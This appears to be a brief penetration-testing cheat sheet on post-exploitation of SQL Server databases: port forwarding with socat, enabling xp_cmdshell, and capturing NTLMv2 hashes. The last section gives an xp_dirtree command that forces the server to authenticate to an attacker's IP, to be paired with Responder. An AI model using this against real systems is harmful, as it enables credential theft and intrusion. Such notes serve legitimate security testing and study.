# Database Post Exploitation

## Access Database

- Make port available on a public port using `socat` local port forwarding
- Use `dbeaver` to access the database


## Enable xp_cmdshell

Check [this](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/)

## xp_cmdshell to NTMLv2

- Use responder and a fake impacket SMB server
- Call `master..xp_dirtree '\\<IP>\foo'`
